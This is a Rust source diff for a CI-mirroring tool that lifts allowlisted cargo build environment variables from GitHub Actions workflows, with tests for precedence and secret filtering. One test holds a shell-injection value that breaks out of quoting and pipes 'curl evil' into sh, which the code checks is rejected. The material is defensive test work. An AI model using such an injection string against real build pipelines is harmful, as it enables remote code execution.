@@ -15,6 +15,7 @@
 //! recoverable error type because parsing fallback is the operational
 //! safety net that lets bellows keep running against any target repo.
 
+use std::collections::BTreeMap;
 use std::path::{Path, PathBuf};
 
 use yaml_rust2::{Yaml, YamlLoader};
@@ -26,6 +27,12 @@ use yaml_rust2::{Yaml, YamlLoader};
 /// literal `cargo clippy ...` / `cargo test ...` line — the caller
 /// substitutes a fallback from `Config.gates` for any `None` field.
 ///
+/// `clippy_env` / `test_env` carry the build-relevant environment the
+/// CI step ran that command under (issue #180). Sorted by name for a
+/// deterministic gate posture, and empty when the workflow declared
+/// none. The env travels *with* its command because a repo can split
+/// clippy and test into sibling jobs whose env blocks differ.
+///
 /// `source` reports whether at least one command was extracted from a
 /// workflow file (`ParsedFromWorkflow(path)`) or none were
 /// (`FallbackFromConfig`). It is the file-level provenance, not the
@@ -34,7 +41,9 @@ use yaml_rust2::{Yaml, YamlLoader};
 #[derive(Debug, Default, Clone, PartialEq, Eq)]
 pub struct ExtractedCommands {
     pub clippy: Option<String>,
+    pub clippy_env: Vec<(String, String)>,
     pub test: Option<String>,
+    pub test_env: Vec<(String, String)>,
     pub source: Provenance,
 }
 
@@ -117,11 +126,13 @@ pub fn parse_ci_workflow(repo_root: &Path) -> ExtractedCommands {
         if doc["name"].as_str() != Some("CI") {
             continue;
         }
-        let (clippy, test) = extract_from_workflow(doc);
-        if clippy.is_some() || test.is_some() {
+        let extracted = extract_from_workflow(doc);
+        if extracted.clippy.is_some() || extracted.test.is_some() {
             return ExtractedCommands {
-                clippy,
-                test,
+                clippy: extracted.clippy,
+                clippy_env: extracted.clippy_env,
+                test: extracted.test,
+                test_env: extracted.test_env,
                 source: Provenance::ParsedFromWorkflow(path.clone()),
             };
         }
@@ -150,12 +161,107 @@ pub fn parse_ci_workflow(repo_root: &Path) -> ExtractedCommands {
 /// gate to mirror the target's *actual* clippy scope, so we must keep
 /// looking for each command across sibling jobs.
 ///
+/// What one workflow (or one job) yielded: each command plus the
+/// build-relevant env of the step that ran it (issue #180).
+#[derive(Debug, Default, Clone, PartialEq, Eq)]
+struct JobExtract {
+    clippy: Option<String>,
+    clippy_env: Vec<(String, String)>,
+    test: Option<String>,
+    test_env: Vec<(String, String)>,
+}
+
+/// Environment-variable names bellows mirrors from the target repo's CI
+/// into its cargo-checks gate (issue #180).
+///
+/// **Allowlist, not denylist** — the gate must reproduce CI's *build
+/// posture*, never its secrets. A workflow's `env:` block routinely
+/// carries tokens and deploy keys (`${{ secrets.* }}`), and forwarding
+/// those into the gate container would hand the target repo's
+/// credentials to a sandbox that has no need for them. Only names that
+/// tune the Rust build are eligible; everything else — including
+/// anything bellows has never heard of — is dropped.
+///
+/// The motivating case (#180): `workboard-financial-advice` sets
+/// `CARGO_PROFILE_TEST_DEBUG: "0"` on its clippy and test steps as a
+/// documented linker-OOM guard. Bellows mirrored the *command* but not
+/// that env, so the gate linked its test binaries with full
+/// `debuginfo=2`, got OOM-killed (`ld terminated with signal 9`), and
+/// reported a false `FinalTestsRed` on code the repo's own CI passes.
+fn is_build_relevant_env_name(name: &str) -> bool {
+    const EXACT: [&str; 7] = [
+        "CARGO_INCREMENTAL",
+        "CARGO_NET_GIT_FETCH_WITH_CLI",
+        "CARGO_TERM_COLOR",
+        "RUSTFLAGS",
+        "RUSTDOCFLAGS",
+        "RUST_BACKTRACE",
+        "RUST_MIN_STACK",
+    ];
+    // `CARGO_PROFILE_*` covers the whole profile surface
+    // (CARGO_PROFILE_TEST_DEBUG, _RELEASE_LTO, _DEV_OPT_LEVEL, ...);
+    // `CARGO_BUILD_*` covers jobs/target/rustflags.
+    const PREFIXES: [&str; 2] = ["CARGO_PROFILE_", "CARGO_BUILD_"];
+    EXACT.contains(&name) || PREFIXES.iter().any(|p| name.starts_with(p))
+}
+
+/// Whether an env value is safe to embed in the gate command string.
+///
+/// The composed command is handed to `sh -c` inside the sandbox, and
+/// bellows single-quotes each value, so the only character that could
+/// break out of the quoting is a single quote itself. Newlines are
+/// rejected for the same reason, and `${{` marks an unresolved GitHub
+/// Actions expression (a secret or matrix reference) that bellows cannot
+/// evaluate and must never pass through literally.
+///
+/// Rejected values are dropped individually — the command still runs,
+/// just without that one env entry, which is strictly closer to CI than
+/// today's behaviour of dropping every env entry.
+fn env_value_is_safe(value: &str) -> bool {
+    !value.contains('\'')
+        && !value.contains('\n')
+        && !value.contains('\r')
+        && !value.contains("${{")
+}
+
+/// Merge the allowlisted entries of `container["env"]` into `out`.
+/// Later calls override earlier ones, which is how GitHub Actions
+/// layers workflow-level → job-level → step-level `env:`.
+fn collect_build_env(container: &Yaml, out: &mut BTreeMap<String, String>) {
+    let Some(env) = container["env"].as_hash() else {
+        return;
+    };
+    for (key, value) in env {
+        let Some(name) = key.as_str() else { continue };
+        if !is_build_relevant_env_name(name) {
+            continue;
+        }
+        // Scalars only. `CARGO_PROFILE_TEST_DEBUG: "0"` parses as a
+        // String; the unquoted `0` / `true` forms parse as Integer /
+        // Boolean, so normalise those rather than dropping them.
+        let rendered = match value {
+            Yaml::String(s) => s.clone(),
+            Yaml::Integer(i) => i.to_string(),
+            Yaml::Boolean(b) => b.to_string(),
+            Yaml::Real(r) => r.clone(),
+            _ => continue,
+        };
+        if !env_value_is_safe(&rendered) {
+            continue;
+        }
+        out.insert(name.to_string(), rendered);
+    }
+}
+
 /// When no job runs on a Linux runner, falls back to the first declared
 /// job — the matrix-without-ubuntu shape.
-fn extract_from_workflow(doc: &Yaml) -> (Option<String>, Option<String>) {
+fn extract_from_workflow(doc: &Yaml) -> JobExtract {
     let Some(jobs) = doc["jobs"].as_hash() else {
-        return (None, None);
+        return JobExtract::default();
     };
+    // Workflow-level `env:` is the base layer every job inherits.
+    let mut workflow_env = BTreeMap::new();
+    collect_build_env(doc, &mut workflow_env);
     let mut linux_jobs: Vec<&Yaml> = Vec::new();
     let mut first_job: Option<&Yaml> = None;
     for (_name, body) in jobs {
@@ -171,8 +277,8 @@ fn extract_from_workflow(doc: &Yaml) -> (Option<String>, Option<String>) {
     // an unresolvable `runs-on` still extracts.
     if linux_jobs.is_empty() {
         return match first_job {
-            Some(job) => extract_from_job(job),
-            None => (None, None),
+            Some(job) => extract_from_job(job, &workflow_env),
+            None => JobExtract::default(),
         };
     }
     // Accumulate clippy and test INDEPENDENTLY across every Linux job in
@@ -181,21 +287,23 @@ fn extract_from_workflow(doc: &Yaml) -> (Option<String>, Option<String>) {
     // `clippy:` / `test:` jobs, and returning at the first job to yield
     // either command would drop the other and force a `-D warnings`
     // fallback for it.
-    let mut clippy = None;
-    let mut test = None;
+    let mut acc = JobExtract::default();
     for job in &linux_jobs {
-        let (c, t) = extract_from_job(job);
-        if clippy.is_none() {
-            clippy = c;
+        let found = extract_from_job(job, &workflow_env);
+        // Each command carries its own env, so they must move together.
+        if acc.clippy.is_none() {
+            acc.clippy = found.clippy;
+            acc.clippy_env = found.clippy_env;
         }
-        if test.is_none() {
-            test = t;
+        if acc.test.is_none() {
+            acc.test = found.test;
+            acc.test_env = found.test_env;
         }
-        if clippy.is_some() && test.is_some() {
+        if acc.clippy.is_some() && acc.test.is_some() {
             break;
         }
     }
-    (clippy, test)
+    acc
 }
 
 /// Whether a `jobs.<name>` body runs on a Linux runner. Accepts a
@@ -260,34 +368,44 @@ fn matrix_axis_has_ubuntu(job: &Yaml, key: &str) -> bool {
 /// continuations are reconstituted before matching so a cargo
 /// invocation split across physical lines is captured as the full
 /// logical command bellows runs under `sh -c`.
-fn extract_from_job(job: &Yaml) -> (Option<String>, Option<String>) {
+///
+/// Each captured command also carries the build-relevant env in scope
+/// for its step (issue #180), layered workflow → job → step so the
+/// nearest declaration wins — the same precedence GitHub Actions
+/// applies.
+fn extract_from_job(job: &Yaml, workflow_env: &BTreeMap<String, String>) -> JobExtract {
+    let mut out = JobExtract::default();
     let Some(steps) = job["steps"].as_vec() else {
-        return (None, None);
+        return out;
     };
-    let mut clippy = None;
-    let mut test = None;
+    let mut job_env = workflow_env.clone();
+    collect_build_env(job, &mut job_env);
     for step in steps {
         let Some(run) = step["run"].as_str() else {
             continue;
         };
+        let mut step_env = job_env.clone();
+        collect_build_env(step, &mut step_env);
         for line in collapse_backslash_continuations(run) {
             let trimmed = line.trim();
-            if clippy.is_none()
+            if out.clippy.is_none()
                 && let Some(cmd) = match_cargo_command(trimmed, "clippy")
             {
-                clippy = Some(cmd);
+                out.clippy = Some(cmd);
+                out.clippy_env = step_env.clone().into_iter().collect();
             }
-            if test.is_none()
+            if out.test.is_none()
                 && let Some(cmd) = match_cargo_command(trimmed, "test")
             {
-                test = Some(cmd);
+                out.test = Some(cmd);
+                out.test_env = step_env.clone().into_iter().collect();
             }
-            if clippy.is_some() && test.is_some() {
-                return (clippy, test);
+            if out.clippy.is_some() && out.test.is_some() {
+                return out;
             }
         }
     }
-    (clippy, test)
+    out
 }
 
 /// Collapse shell-style backslash continuations within a multi-line
@@ -436,14 +554,14 @@ jobs:
       - run: cargo clippy --locked --workspace --all-targets --all-features -- -D clippy::correctness -D clippy::suspicious
 ",
         );
-        let (clippy, test) = extract_from_workflow(&d);
+        let got = extract_from_workflow(&d);
         assert_eq!(
-            clippy.as_deref(),
+            got.clippy.as_deref(),
             Some("cargo clippy --locked --workspace --all-targets --all-features -- -D clippy::correctness -D clippy::suspicious"),
             "clippy must be mirrored from the separate `clippy:` job, not fall back to -D warnings",
         );
         assert_eq!(
-            test.as_deref(),
+            got.test.as_deref(),
             Some("cargo test --locked --workspace --all-features"),
         );
     }
@@ -462,9 +580,13 @@ jobs:
       - run: cargo clippy --all-targets -- -D warnings
 ",
         );
-        let (clippy, test) = extract_from_workflow(&d);
-        assert_eq!(clippy.as_deref(), Some("cargo clippy --all-targets -- -D warnings"));
-        assert_eq!(test.as_deref(), Some("cargo test --all-features"));
+        let got = extract_from_workflow(&d);
+        assert_eq!(got.clippy.as_deref(), Some("cargo clippy --all-targets -- -D warnings"));
+        assert_eq!(got.test.as_deref(), Some("cargo test --all-features"));
+        assert!(
+            got.clippy_env.is_empty() && got.test_env.is_empty(),
+            "a workflow declaring no env must lift none (issue #180: no behaviour change)",
+        );
     }
 
     #[test]
@@ -481,11 +603,169 @@ jobs:
       - run: cargo clippy --all-targets --all-features -- -D clippy::correctness
 ",
         );
-        let (clippy, test) = extract_from_workflow(&d);
+        let got = extract_from_workflow(&d);
         assert_eq!(
-            clippy.as_deref(),
+            got.clippy.as_deref(),
             Some("cargo clippy --all-targets --all-features -- -D clippy::correctness"),
         );
-        assert_eq!(test, None);
+        assert_eq!(got.test, None);
+    }
+
+    // ---- Issue #180: mirror CI's build env, not just its command ----
+
+    #[test]
+    fn lifts_step_level_cargo_profile_env_from_fa_shaped_workflow() {
+        // The exact shape that produced the false FinalTestsRed on
+        // workboard-financial-advice #46/#280: sibling `test:` and
+        // `clippy:` jobs, each setting the linker-OOM guard on the STEP.
+        let d = doc(
+"name: CI
+on: [push]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: cargo test
+        env:
+          CARGO_NET_GIT_FETCH_WITH_CLI: \"true\"
+          CARGO_PROFILE_TEST_DEBUG: \"0\"
+        run: cargo test --locked --workspace --lib --bins --tests --all-features
+  clippy:
+    runs-on: ubuntu-latest
+    steps:
+      - name: cargo clippy
+        env:
+          CARGO_PROFILE_TEST_DEBUG: \"0\"
+        run: cargo clippy --locked --workspace --all-targets --all-features -- -D clippy::correctness
+",
+        );
+        let got = extract_from_workflow(&d);
+        assert_eq!(
+            got.test_env,
+            vec![
+                ("CARGO_NET_GIT_FETCH_WITH_CLI".to_string(), "true".to_string()),
+                ("CARGO_PROFILE_TEST_DEBUG".to_string(), "0".to_string()),
+            ],
+            "the test step's OOM guard must be mirrored into the gate",
+        );
+        assert_eq!(
+            got.clippy_env,
+            vec![("CARGO_PROFILE_TEST_DEBUG".to_string(), "0".to_string())],
+            "env travels with its own command across sibling jobs",
+        );
+    }
+
+    #[test]
+    fn never_lifts_secrets_or_unresolved_expressions() {
+        // Allowlist contract: a workflow env block routinely carries
+        // tokens. None of these may reach the gate container.
+        let d = doc(
+"name: CI
+on: [push]
+env:
+  GITHUB_TOKEN: hunter2
+  AWS_SECRET_ACCESS_KEY: hunter2
+  MY_DEPLOY_KEY: hunter2
+  CARGO_PROFILE_TEST_DEBUG: \"0\"
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    env:
+      RUSTFLAGS: ${{ secrets.SNEAKY }}
+    steps:
+      - run: cargo test --all-features
+",
+        );
+        let got = extract_from_workflow(&d);
+        assert_eq!(
+            got.test_env,
+            vec![("CARGO_PROFILE_TEST_DEBUG".to_string(), "0".to_string())],
+            "only allowlisted, resolvable env is lifted; got {:?}",
+            got.test_env,
+        );
+    }
+
+    #[test]
+    fn step_env_overrides_job_and_workflow_env() {
+        // GitHub precedence: workflow < job < step.
+        let d = doc(
+"name: CI
+on: [push]
+env:
+  CARGO_INCREMENTAL: \"1\"
+  RUST_BACKTRACE: \"0\"
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    env:
+      CARGO_INCREMENTAL: \"2\"
+    steps:
+      - env:
+          CARGO_INCREMENTAL: \"3\"
+        run: cargo test --all-features
+",
+        );
+        let got = extract_from_workflow(&d);
+        assert_eq!(
+            got.test_env,
+            vec![
+                ("CARGO_INCREMENTAL".to_string(), "3".to_string()),
+                ("RUST_BACKTRACE".to_string(), "0".to_string()),
+            ],
+            "nearest declaration must win; workflow-level entries still inherit",
+        );
+    }
+
+    #[test]
+    fn rejects_env_values_that_would_break_out_of_shell_quoting() {
+        // The composed command is single-quoted and handed to `sh -c`,
+        // so a value containing a quote must be dropped, not embedded.
+        let d = doc(
+"name: CI
+on: [push]
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          RUSTFLAGS: \"x'; curl evil | sh; echo '\"
+          CARGO_INCREMENTAL: \"0\"
+        run: cargo test --all-features
+",
+        );
+        let got = extract_from_workflow(&d);
+        assert_eq!(
+            got.test_env,
+            vec![("CARGO_INCREMENTAL".to_string(), "0".to_string())],
+            "quote-bearing value must be dropped individually; got {:?}",
+            got.test_env,
+        );
+    }
+
+    #[test]
+    fn normalises_unquoted_scalar_env_values() {
+        // `CARGO_PROFILE_TEST_DEBUG: 0` (no quotes) parses as an
+        // Integer; it must still be mirrored, not silently dropped.
+        let d = doc(
+"name: CI
+on: [push]
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          CARGO_PROFILE_TEST_DEBUG: 0
+          CARGO_NET_GIT_FETCH_WITH_CLI: true
+        run: cargo test --all-features
+",
+        );
+        let got = extract_from_workflow(&d);
+        assert_eq!(
+            got.test_env,
+            vec![
+                ("CARGO_NET_GIT_FETCH_WITH_CLI".to_string(), "true".to_string()),
+                ("CARGO_PROFILE_TEST_DEBUG".to_string(), "0".to_string()),
+            ],
+        );
     }
 }
